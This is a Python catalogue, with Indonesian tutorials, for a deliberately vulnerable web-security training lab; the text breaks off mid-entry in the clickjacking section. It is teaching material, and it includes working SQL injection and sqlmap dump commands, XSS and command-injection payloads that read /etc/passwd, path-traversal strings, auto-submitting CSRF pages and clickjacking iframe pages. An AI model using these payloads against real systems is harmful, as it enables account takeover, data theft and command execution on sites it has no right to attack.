"""
Katalog lab. Setiap kategori punya 3 level: apprentice, practitioner, expert.
`implemented=True` berarti lab benar-benar vulnerable dan bisa diserang
(route Flask sungguhan). Selain itu ditampilkan sebagai "Segera hadir"
tapi tutorialnya tetap lengkap.
"""

LEVELS = ["apprentice", "practitioner", "expert"]

LEVEL_META = {
    "apprentice": {"label": "APPRENTICE", "color": "#16A34A"},
    "practitioner": {"label": "PRACTITIONER", "color": "#2563EB"},
    "expert": {"label": "EXPERT", "color": "#7C3AED"},
}

CATEGORIES = [
    {
        "slug": "sql-injection",
        "name": "SQL injection",
        "summary": "Manipulasi query SQL lewat input yang tidak difilter.",
        "implemented": True,
    },
    {
        "slug": "xss",
        "name": "Cross-site scripting (XSS)",
        "summary": "Injeksi skrip ke halaman yang dilihat pengguna lain.",
        "implemented": True,
    },
    {
        "slug": "command-injection",
        "name": "OS command injection",
        "summary": "Menjalankan perintah sistem lewat input aplikasi.",
        "implemented": True,
    },
    {
        "slug": "path-traversal",
        "name": "Path traversal",
        "summary": "Mengakses file di luar direktori yang dimaksud.",
        "implemented": True,
    },
    {
        "slug": "csrf",
        "name": "Cross-site request forgery (CSRF)",
        "summary": "Pelajari anatomi kerentanan CSRF dan cara memitigasinya.",
        "implemented": True,
    },
    {
        "slug": "clickjacking",
        "name": "Clickjacking",
        "summary": "Menipu pengguna mengklik elemen tersembunyi lewat iframe.",
        "implemented": True,
    },
    {
        "slug": "dom-based",
        "name": "DOM-based vulnerabilities",
        "summary": "Kerentanan yang muncul murni dari JavaScript sisi klien.",
        "implemented": True,
    },
    {
        "slug": "cors",
        "name": "Cross-origin resource sharing (CORS)",
        "summary": "Konfigurasi CORS longgar yang membocorkan data lintas origin.",
        "implemented": True,
    },
    {
        "slug": "xxe",
        "name": "XML external entity (XXE) injection",
        "summary": "Parser XML yang memproses entity eksternal berbahaya.",
        "implemented": True,
    },
    {
        "slug": "ssrf",
        "name": "Server-side request forgery (SSRF)",
        "summary": "Server dipaksa membuat request ke tujuan yang dikendalikan penyerang.",
        "implemented": True,
    },
    {
        "slug": "request-smuggling",
        "name": "HTTP request smuggling",
        "summary": "Perbedaan interpretasi request antara front-end dan back-end.",
        "implemented": True,
    },
    {
        "slug": "ssti",
        "name": "Server-side template injection",
        "summary": "Input pengguna dievaluasi langsung oleh template engine.",
        "implemented": True,
    },
    {
        "slug": "access-control",
        "name": "Access control vulnerabilities",
        "summary": "Pemeriksaan otorisasi yang bisa dilewati.",
        "implemented": True,
    },
    {
        "slug": "authentication",
        "name": "Authentication",
        "summary": "Kelemahan pada mekanisme login dan sesi.",
        "implemented": True,
    },
    {
        "slug": "deserialization",
        "name": "Insecure deserialization",
        "summary": "Objek yang di-deserialize dari input tak tepercaya.",
        "implemented": True,
    },
    {
        "slug": "file-upload",
        "name": "File upload vulnerabilities",
        "summary": "Validasi upload file yang tidak memadai.",
        "implemented": True,
    },
]

CATEGORY_MAP = {c["slug"]: c for c in CATEGORIES}

# Tutorial & metadata tiap lab
LABS = {
    "sql-injection": {
        "apprentice": {
            "title": "SQL injection sederhana pada filter produk",
            "goal": "Login sebagai administrator dengan membypass autentikasi memakai UNION-based SQL injection.",
            "tutorial": """
<p>Lab ini punya halaman <code>/lab/sql-injection/apprentice/login</code> yang membangun query SQL
dengan menggabungkan string input pengguna secara langsung, tanpa parameterized query:</p>
<pre><code>query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"</code></pre>
<p>Karena input tidak di-escape, kamu bisa menyisipkan potongan SQL sendiri lewat kolom username.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Langkah manual</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman login lab.</li>
<li>Isi username dengan: <code>administrator'--</code></li>
<li>Isi password bebas, misalnya <code>x</code>.</li>
<li>Query jadi <code>... WHERE username='administrator'--' AND password='x'</code>. Tanda <code>--</code>
membuat sisa query jadi komentar, sehingga password tidak dicek.</li>
</ol>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan sqlmap</h3>
<pre><code>sqlmap -u "http://TARGET/lab/sql-injection/apprentice/login" \\
  --data="username=admin&password=admin" \\
  -p username --batch --dump</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan Burp Suite</h3>
<p>Tangkap request login lewat Proxy, kirim ke Repeater, lalu coba payload di atas pada parameter
<code>username</code>. Bandingkan response saat login berhasil vs gagal.</p>
""",
        },
        "practitioner": {
            "title": "Blind SQL injection berbasis boolean",
            "goal": "Ekstrak password administrator karakter demi karakter memakai respons true/false.",
            "tutorial": """
<p>Endpoint <code>/lab/sql-injection/practitioner/check</code> menerima parameter <code>id</code>
dan hanya mengembalikan "Item ditemukan" atau "Item tidak ditemukan" — tidak ada pesan error SQL yang
bocor, sehingga kamu harus menyimpulkan data dari perbedaan respons (blind).</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Konsep payload</h3>
<pre><code>1 AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'</code></pre>
<p>Ubah posisi karakter dan karakter tebakan satu per satu, amati apakah respons "ditemukan" atau tidak.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan sqlmap (paling praktis untuk blind)</h3>
<pre><code>sqlmap -u "http://TARGET/lab/sql-injection/practitioner/check?id=1" \\
  --technique=B --batch --dump-all -T users</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan Burp Suite Intruder</h3>
<p>Gunakan payload list karakter a-z0-9, posisi ditandai dengan penanda Intruder, lalu bandingkan
panjang/isi response tiap request untuk menentukan karakter yang benar.</p>
""",
        },
        "expert": {
            "title": "Time-based blind SQL injection",
            "goal": "Konfirmasi dan ekstrak data walau tidak ada perbedaan output sama sekali, hanya lewat delay waktu respons.",
            "tutorial": """
<p>Endpoint <code>/lab/sql-injection/expert/search</code> selalu mengembalikan tampilan yang identik
apa pun hasil query-nya (true/false tidak terlihat dari luar). Satu-satunya sinyal yang tersisa adalah
waktu respons, karena aplikasi memakai SQLite yang mendukung fungsi delay.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload konsep (SQLite tidak punya SLEEP native, lab ini mensimulasikan delay lewat subquery berat saat kondisi benar)</h3>
<pre><code>' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(50000000) ELSE 1 END
FROM users WHERE username='administrator')-- </code></pre>
<p>Jika kondisi benar, server butuh waktu jauh lebih lama untuk merespons.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan sqlmap</h3>
<pre><code>sqlmap -u "http://TARGET/lab/sql-injection/expert/search?q=test" \\
  --technique=T --time-sec=3 --batch --dump-all -T users</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Tips</h3>
<p>Ukur baseline response time normal dulu sebelum menyimpulkan delay signifikan, supaya tidak salah
baca karena jitter jaringan.</p>
""",
        },
    },
    "xss": {
        "apprentice": {
            "title": "Reflected XSS pada kolom pencarian",
            "goal": "Jalankan <code>alert(document.domain)</code> lewat parameter pencarian yang dipantulkan langsung ke HTML.",
            "tutorial": """
<p>Endpoint <code>/lab/xss/apprentice/search?q=...</code> menyisipkan nilai <code>q</code> langsung
ke HTML tanpa encoding:</p>
<pre><code>&lt;p&gt;Hasil untuk: {{ q|safe }}&lt;/p&gt;</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
<p>Akses langsung lewat URL: <code>/lab/xss/apprentice/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Verifikasi dengan Burp</h3>
<p>Gunakan Burp Repeater untuk mengirim payload ke parameter <code>q</code> dan periksa apakah tag
<code>&lt;script&gt;</code> muncul apa adanya di response HTML (tanda tidak ada output encoding).</p>
""",
        },
        "practitioner": {
            "title": "Stored XSS lewat kolom komentar dengan filter lemah",
            "goal": "Simpan payload XSS ke database lewat form komentar yang lolos dari filter blacklist sederhana.",
            "tutorial": """
<p>Form komentar di <code>/lab/xss/practitioner/comment</code> memblokir string <code>&lt;script&gt;</code>
(case-sensitive, tanpa cek tag lain), sehingga bisa dilewati dengan tag event handler seperti
<code>&lt;img&gt;</code> atau variasi huruf besar/kecil.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload contoh</h3>
<pre><code>&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
<pre><code>&lt;ScRiPt&gt;alert(document.domain)&lt;/ScRiPt&gt;</code></pre>
<p>Kirim lewat form komentar, lalu buka halaman daftar komentar — payload akan tereksekusi setiap kali
halaman dimuat oleh pengunjung mana pun (stored).</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan Burp Suite</h3>
<p>Gunakan Repeater untuk mencoba berbagai payload melewati filter, lalu Proxy History untuk melihat
apakah payload tersimpan apa adanya di response GET komentar.</p>
""",
        },
        "expert": {
            "title": "DOM-based XSS lewat fragment URL (hash)",
            "goal": "Eksekusi JavaScript tanpa request ke server, murni lewat sink JavaScript sisi klien yang membaca location.hash.",
            "tutorial": """
<p>Halaman <code>/lab/xss/expert/welcome</code> memuat skrip client-side seperti ini:</p>
<pre><code>document.getElementById('greeting').innerHTML = 'Halo, ' + decodeURIComponent(location.hash.slice(1));</code></pre>
<p>Karena <code>innerHTML</code> dipakai (sink berbahaya) dan sumber data adalah
<code>location.hash</code> yang sepenuhnya dikendalikan penyerang, tidak ada request server sama
sekali — filter server-side tidak akan pernah melihat payload ini.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
<pre><code>http://TARGET/lab/xss/expert/welcome#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Cara menemukan sink ini</h3>
<p>Gunakan Burp Suite DOM Invader (built-in Chromium Burp) atau baca sumber JavaScript halaman untuk
mencari sink seperti innerHTML, document.write, eval yang
menerima sumber tak tepercaya seperti <code>location.hash</code>, <code>location.search</code>.</p>
""",
        },
    },
    "command-injection": {
        "apprentice": {
            "title": "OS command injection pada fitur ping",
            "goal": "Jalankan perintah sistem tambahan lewat fitur 'test koneksi' yang memanggil ping di shell.",
            "tutorial": """
<p>Endpoint <code>/lab/command-injection/apprentice/ping?host=...</code> menjalankan:</p>
<pre><code>os.system(f"ping -c 1 {host}")</code></pre>
<p>Tanpa validasi input, kamu bisa menambahkan operator shell untuk menjalankan perintah lain.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
<pre><code>127.0.0.1; whoami</code></pre>
<pre><code>127.0.0.1 && id</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan curl</h3>
<pre><code>curl "http://TARGET/lab/command-injection/apprentice/ping?host=127.0.0.1;whoami"</code></pre>
<p>Output <code>whoami</code> akan ikut tampil di halaman hasil ping.</p>
""",
        },
        "practitioner": {
            "title": "Blind command injection tanpa output",
            "goal": "Buktikan command injection tanpa melihat output langsung, memakai delay perintah <code>sleep</code>.",
            "tutorial": """
<p>Endpoint <code>/lab/command-injection/practitioner/notify?email=...</code> menjalankan perintah
sistem di background dan tidak pernah menampilkan output apa pun ke response.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload pembuktian</h3>
<pre><code>test@test.com; sleep 5</code></pre>
<p>Jika response butuh waktu ~5 detik lebih lama dari biasanya, berarti perintah tersisip berhasil
dieksekusi walau tak ada output yang terlihat.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan sqlmap-style thinking / curl + time</h3>
<pre><code>time curl "http://TARGET/lab/command-injection/practitioner/notify?email=test@test.com;sleep+5"</code></pre>
""",
        },
        "expert": {
            "title": "Command injection dengan filter karakter & bypass",
            "goal": "Lewati filter yang memblokir spasi dan beberapa metakarakter umum.",
            "tutorial": """
<p>Endpoint <code>/lab/command-injection/expert/lookup?domain=...</code> memblokir karakter
spasi, <code>;</code>, dan <code>&amp;&amp;</code> secara eksplisit, tapi lupa memblokir
<code>|</code> dan <code>$IFS</code> (pengganti spasi di shell).</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload bypass spasi</h3>
<pre><code>example.com|whoami</code></pre>
<pre><code>example.com|cat$IFS/etc/passwd</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Tips reconnaissance</h3>
<p>Selalu coba metakarakter satu per satu (<code>; | & $() `` </code>) untuk memetakan mana yang
difilter, lalu cari pengganti untuk karakter yang diblokir (mis. <code>$IFS</code>,
<code>{ls,-la}</code> untuk mengganti spasi).</p>
""",
        },
    },
    "path-traversal": {
        "apprentice": {
            "title": "Path traversal langsung pada image viewer",
            "goal": "Baca file /etc/passwd (simulasi) lewat parameter nama file yang tidak divalidasi.",
            "tutorial": """
<p>Endpoint <code>/lab/path-traversal/apprentice/image?filename=...</code> menggabungkan input
langsung ke path file:</p>
<pre><code>open(f"./files/{filename}")</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
<pre><code>../../../../etc/passwd</code></pre>
<p>Akses: <code>/lab/path-traversal/apprentice/image?filename=../../../../etc/passwd</code></p>
""",
        },
        "practitioner": {
            "title": "Path traversal dengan filter penghapus '../' (non-recursive)",
            "goal": "Lewati filter yang menghapus '../' hanya sekali, memakai payload berlapis.",
            "tutorial": """
<p>Aplikasi mencoba menyaring dengan <code>filename.replace('../', '')</code> — hanya sekali,
sehingga bisa dilewati dengan menyisipkan pola berlapis.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload</h3>
<pre><code>....//....//....//....//etc/passwd</code></pre>
<p>Setelah satu kali penggantian <code>../</code> dihapus dari tengah, sisa string membentuk
<code>../../../../etc/passwd</code> yang valid.</p>
""",
        },
        "expert": {
            "title": "Path traversal dengan bypass encoding & validasi ekstensi",
            "goal": "Lewati validasi yang mewajibkan file berakhiran .png, sambil tetap membaca file arbitrer.",
            "tutorial": """
<p>Aplikasi memvalidasi <code>filename.endswith('.png')</code> sekaligus memblokir <code>../</code>
literal. Namun decoding URL dilakukan setelah pengecekan awal, dan null byte lama / path
"file.png" via trailing dilewati lewat trik <code>%2500</code> pada beberapa server, atau di
lab ini disimulasikan lewat parameter tambahan yang tidak divalidasi ekstensinya.</p>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload (URL-encoded)</h3>
<pre><code>..%2f..%2f..%2f..%2fetc%2fpasswd%00.png</code></pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Dengan Burp Suite</h3>
<p>Gunakan Decoder untuk mencoba beberapa lapis encoding (single vs double URL-encode) dan Repeater
untuk menguji kombinasi mana yang diterima validasi ekstensi tapi tetap traversal.</p>
""",
        },
    },
    "csrf": {
        "apprentice": {
            "title": "CSRF tanpa Perlindungan Token",
            "video_url": "https://www.youtube.com/embed/vYc2URBgJ8?si=3bLF1TLaIChNm8Zo",
            "goal": "Eksploitasi kerentanan CSRF untuk mengubah alamat email pengguna. Buat <i>payload</i> HTML yang akan secara otomatis mengirimkan <i>request</i> pengubahan email saat dibuka oleh korban.",
            "tutorial": """
                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar CSRF</h3>
                <p><b>Cross-Site Request Forgery (CSRF)</b> adalah kerentanan web yang memaksa pengguna yang sedang login untuk melakukan tindakan yang tidak mereka kehendaki pada aplikasi web yang mereka percayai. Penyerang tidak bisa melihat respons dari server, sehingga CSRF biasanya digunakan untuk tindakan yang mengubah <i>state</i> (status), seperti mengubah email, mentransfer dana, atau mengubah password.</p>
                <p>Kerentanan ini muncul ketika aplikasi bergantung sepenuhnya pada <i>cookies</i> sesi (session cookies) untuk mengidentifikasi pengguna, dan tidak memiliki mekanisme perlindungan tambahan seperti <b>Anti-CSRF Token</b>.</p>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kerentanan</h3>
                <p>Pada lab ini, fitur pengubahan email menerima <i>request</i> POST ke <code>/lab/csrf/apprentice/email</code>. Jika Anda memeriksa <i>request</i> tersebut (menggunakan Burp Suite atau Network Tab), tidak ada parameter acak yang sulit ditebak (seperti token CSRF). Aplikasi hanya memvalidasi sesi cookie Anda.</p>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi (Step-by-Step)</h3>
                <ol class="list-decimal pl-5 space-y-2 mb-4">
                    <li>Buka halaman lab dengan mengklik tombol <b>Akses Lab Interaktif</b> di bawah, dan masuk ke menu "Perbarui Email".</li>
                    <li>Ubah email menjadi nilai apa saja (misal: <code>test@ifsec.local</code>) dan klik <b>Update Email</b>.</li>
                    <li>Tangkap <i>request</i> POST tersebut menggunakan <b>Burp Suite Proxy</b>. Anda akan melihat parameter <i>body</i> hanya berisi <code>email=test%40ifsec.local</code>.</li>
                    <li>Klik kanan pada <i>request</i> tersebut di Burp Suite, lalu pilih <b>Engagement tools -> Generate CSRF PoC</b> (jika Anda menggunakan Burp Professional), ATAU buat file HTML manual seperti di bawah ini.</li>
                </ol>
                
                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Payload HTML Penyerang</h3>
                <p>Simpan kode berikut sebagai file <code>exploit.html</code> di komputer Anda. Saat Anda membuka file ini di browser (dalam kondisi masih "login" di IFSEC Lab), form akan terkirim secara otomatis dan email Anda akan berubah menjadi email milik penyerang.</p>
                <pre>&lt;html&gt;
  &lt;body&gt;
    &lt;h1&gt;Anda memenangkan hadiah!&lt;/h1&gt;
    &lt;form action="http://127.0.0.1:5000/lab/csrf/apprentice/email" method="POST" id="csrf-form"&gt;
      &lt;input type="hidden" name="email" value="hacked@attacker.com" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      // Mengirim form secara otomatis saat halaman dimuat
      document.getElementById("csrf-form").submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            """
        },
        "practitioner": {
            "title": "Bypass Token CSRF via Penghapusan Parameter",
            "video_url": "https://www.youtube.com/embed/PL9Gph7HAWA?si=Cki2msp4qYXbAGr7",
            "goal": "Bypass mekanisme validasi token CSRF yang cacat dan ubah email korban. Backend pada lab ini hanya memvalidasi token <b>jika parameter tersebut dikirimkan</b>.",
            "tutorial": """
                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Logika Validasi yang Cacat</h3>
                <p>Banyak developer mencoba mengimplementasikan Anti-CSRF token, namun membuat kesalahan pada logika validasinya. Salah satu kesalahan paling umum adalah <i>"Validate only if present"</i>. Backend hanya membandingkan token dari pengguna dengan token di sesi <b>apabila parameter <code>csrf</code> ada di dalam HTTP Request</b>. Jika parameter tersebut dihapus sepenuhnya, backend melewatkan blok validasi.</p>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Langkah Eksploitasi</h3>
                <ol class="list-decimal pl-5 space-y-2 mb-4">
                    <li>Buka halaman lab. Anda akan melihat sebuah parameter <i>hidden</i> berupa <code>csrf</code> di dalam form pengubahan email.</li>
                    <li>Lakukan percobaan pengubahan email, dan tangkap <i>request</i> POST menggunakan <b>Burp Suite</b>.</li>
                    <li>Kirim <i>request</i> tersebut ke <b>Repeater</b>.</li>
                    <li>Coba ubah nilai token <code>csrf</code> menjadi acak, lalu kirim (Send). Server akan menolak dengan pesan "CSRF token tidak valid".</li>
                    <li>Sekarang, <b>hapus seluruh baris parameter csrf</b> (dan tanda <code>&</code> yang menghubungkannya) dari body request, sehingga body hanya tersisa <code>email=hacked@attacker.com</code>.</li>
                    <li>Kirim <i>request</i> tersebut. Anda akan melihat bahwa server <b>menerima</b> perubahan email!</li>
                </ol>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Pembuatan Payload PoC</h3>
                <p>Karena kita tahu bahwa tidak mengirimkan parameter CSRF sama sekali akan mem-bypass validasi, <i>payload</i> eksploitasinya sama persis dengan level Apprentice, di mana form kita murni hanya mengirimkan parameter <code>email</code>.</p>
                <pre>&lt;form action="http://127.0.0.1:5000/lab/csrf/practitioner/email" method="POST" id="csrf-form"&gt;
  &lt;input type="hidden" name="email" value="pwned@attacker.com" /&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;</pre>
            """
        },
        "expert": {
            "title": "Bypass Validasi Header Referer",
            "video_url": "https://www.youtube.com/embed/vYc2UkRBgJ8?si=3bLF1TLaIChNm8Zo",
            "goal": "Bypass sistem pelindungan CSRF yang bergantung pada HTTP Header <code>Referer</code> dengan cara memodifikasi <i>metadata</i> HTML pada halaman penyerang.",
            "tutorial": """
                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Kelemahan Validasi Referer</h3>
                <p>Selain token acak, beberapa aplikasi menggunakan validasi Header <b>Referer</b> atau <b>Origin</b> untuk memastikan bahwa request dikirim dari domain yang sama. Namun, jika implementasinya cacat (misalnya mengizinkan request yang sama sekali <b>tidak memiliki Header Referer</b> demi alasan kompatibilitas browser lama), penyerang dapat mengeksploitasinya.</p>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Langkah Analisis</h3>
                <ol class="list-decimal pl-5 space-y-2 mb-4">
                    <li>Tangkap <i>request</i> POST pengubahan email menggunakan Burp Suite, lalu kirim ke <b>Repeater</b>.</li>
                    <li>Coba ubah nilai Header <code>Referer: http://127.0.0.1:5000/...</code> menjadi <code>Referer: http://google.com</code>. Server akan menolak request tersebut.</li>
                    <li>Sekarang, hapus seluruh baris Header <code>Referer</code> dari request HTTP.</li>
                    <li>Kirim request tersebut, dan Anda akan melihat bahwa server menerimanya! Ini berarti jika Referer kosong, server mengasumsikannya valid.</li>
                </ol>

                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Payload HTML (Suppressing Referer)</h3>
                <p>Tantangannya adalah: bagaimana cara membuat browser korban <b>tidak</b> mengirimkan header Referer saat mengirim form dari web penyerang? Kita bisa menggunakan tag <code>&lt;meta name="referrer" content="never"&gt;</code> (atau <code>no-referrer</code>) pada bagian <code>&lt;head&gt;</code> HTML penyerang.</p>
                <pre>&lt;html&gt;
  &lt;head&gt;
    &lt;!-- Tag ini memaksa browser membuang Header Referer --&gt;
    &lt;meta name="referrer" content="no-referrer"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="http://127.0.0.1:5000/lab/csrf/expert/email" method="POST" id="csrf-form"&gt;
      &lt;input type="hidden" name="email" value="expert@attacker.com" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.getElementById("csrf-form").submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
            """
        }
    },
    "clickjacking": {
        "apprentice": {
            "title": "Clickjacking Dasar tanpa Proteksi",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Gunakan teknik Clickjacking (iframe transparan) untuk menipu pengguna agar mengklik tombol 'Hapus Akun Permanen' tanpa mereka sadari.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar Clickjacking</h3>
<p><b>Clickjacking (UI redressing)</b> adalah serangan berbasis antarmuka pengguna di mana penyerang menggunakan elemen transparan (biasanya tag <code>&lt;iframe&gt;</code>) untuk memuat halaman web asli milik target, dan meletakkannya tepat di atas elemen umpan (<i>decoy</i>) buatan penyerang.</p>
<p>Dengan teknik ini, korban mengira mereka sedang mengklik tombol aman (seperti "Mainkan Game" atau "Klaim Hadiah"), padahal klik mereka menembus lapisan transparan tersebut dan menekan tombol krusial di halaman target (seperti "Hapus Akun" atau "Transfer Uang").</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kerentanan</h3>
<p>Kerentanan Clickjacking terjadi karena halaman target tidak memiliki perlindungan <i>anti-framing</i>. Aplikasi yang aman seharusnya mengirimkan HTTP Header <code>X-Frame-Options: DENY</code> (atau <code>SAMEORIGIN</code>), atau menggunakan <code>Content-Security-Policy: frame-ancestors</code> untuk mencegah situs pihak ketiga memuatnya di dalam iframe.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi (Step-by-Step)</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka teks editor di komputer Anda dan buat sebuah file bernama <code>exploit.html</code>.</li>
<li>Buat struktur HTML yang memuat iframe menuju URL lab target: <code>http://127.0.0.1:5000/lab/clickjacking/apprentice/delete</code>.</li>
<li>Gunakan CSS untuk membuat elemen <code>&lt;iframe&gt;</code> memiliki posisi <code>absolute</code>, z-index yang lebih tinggi (berada di atas), dan tingkat transparansi (<code>opacity</code>) sekitar 0.3 agar Anda masih bisa melihat halaman target untuk proses penyelarasan (<i>alignment</i>).</li>
<li>Buat sebuah tombol umpan (misalnya "KLIK SAYA UNTUK MENANG!").</li>
<li>Buka file <code>exploit.html</code> di browser Anda. Ubah nilai <code>top</code> dan <code>left</code> pada CSS iframe secara perlahan hingga tombol "Hapus Akun Permanen" dari iframe <b>tepat berada di bawah</b> tombol umpan Anda.</li>
<li>Setelah posisinya pas, ubah <code>opacity: 0.3;</code> menjadi <code>opacity: 0.0001;</code> (nyaris tak terlihat). <i>Payload</i> Anda siap dikirim ke korban!</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Payload HTML Penyerang</h3>
<pre>&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
        /* Elemen iframe web target (transparan dan di atas) */
        iframe {
            position: absolute;
            width: 800px;
            height: 600px;
            opacity: 0.3; /* Ganti menjadi 0.0001 saat eksploitasi final */
            z-index: 2;
            top: -150px; /* Sesuaikan angka ini agar tombol sejajar */
            left: -50px; /* Sesuaikan angka ini agar tombol sejajar */
        }
        /* Tombol umpan penyerang (di bawah iframe) */
        .decoy-button {
            position: absolute;
            z-index: 1;
            top: 250px;
            left: 300px;
            padding: 20px 40px;
            background-color: blue;
            color: white;
            font-size: 20px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="decoy-button"&gt;KLIK SAYA UNTUK MENANG HADIAH!&lt;/div&gt;
    &lt;iframe src="http://127.0.0.1:5000/lab/clickjacking/apprentice/delete"&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            """
        },
        "practitioner": {
            "title": "Bypass Frame-Buster Script Menggunakan Sandbox",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass proteksi JavaScript <i>frame-buster</i> milik target dengan memanfaatkan atribut HTML5 <code>sandbox</code> pada iframe.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Proteksi Frame-Buster Script</h3>
<p>Sebelum adanya header HTTP modern seperti <code>X-Frame-Options</code>, developer menggunakan JavaScript untuk mencegah <i>framing</i>. Skrip perlindungan klasik (<i>Frame-buster</i>) biasanya terlihat seperti ini:</p>
<pre>if (top != self) { top.location = self.location; }</pre>
<p>Skrip ini mengecek apakah jendela teratas (<code>top</code>) sama dengan jendela saat ini (<code>self</code>). Jika tidak sama (berarti halaman sedang dimuat di dalam iframe), skrip akan memaksa jendela utama untuk mengalihkan URL (<i>redirect</i>) ke URL halaman target, sehingga menghancurkan lapisan Clickjacking penyerang.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Cara Melakukan Bypass</h3>
<p>Sebagai penyerang, kita dapat mencegah skrip <i>Frame-buster</i> tersebut dieksekusi dengan memanfaatkan atribut HTML5 <b><code>sandbox</code></b> pada tag <code>&lt;iframe&gt;</code> kita.</p>
<p>Atribut <code>sandbox</code> secara bawaan akan membatasi berbagai kemampuan di dalam iframe, termasuk <b>menonaktifkan eksekusi JavaScript</b>. Dengan menonaktifkan JavaScript, skrip proteksi target tidak akan pernah berjalan.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Gunakan <i>payload</i> dasar dari level Apprentice.</li>
<li>Jika Anda memuat URL target level Practitioner (<code>/lab/clickjacking/practitioner/delete</code>) ke dalam iframe standar, URL browser Anda akan tiba-tiba berubah dan halaman eksploitasi Anda menghilang (ini akibat ulah Frame-buster).</li>
<li>Tambahkan atribut <code>sandbox="allow-forms"</code> ke dalam tag iframe Anda. Atribut <code>allow-forms</code> wajib ditambahkan agar korban tetap bisa mengirimkan form Hapus Akun secara otomatis saat tombol ditekan.</li>
<li>Muat ulang file eksploitasi. Halaman target kini berhasil dibingkai (<i>framed</i>) tanpa interupsi!</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Payload HTML Penyerang</h3>
<pre>&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
        iframe {
            position: absolute; width: 800px; height: 600px; 
            opacity: 0.3; z-index: 2; top: -150px; left: -50px;
        }
        .decoy-button {
            position: absolute; z-index: 1; top: 250px; left: 300px;
            padding: 20px 40px; background-color: green; color: white;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="decoy-button"&gt;KLIK DI SINI&lt;/div&gt;
    &lt;!-- Penambahan atribut sandbox --&gt;
    &lt;iframe sandbox="allow-forms" src="http://127.0.0.1:5000/lab/clickjacking/practitioner/delete"&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            """
        },
        "expert": {
            "title": "Clickjacking dengan Pre-filled Form Parameters",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
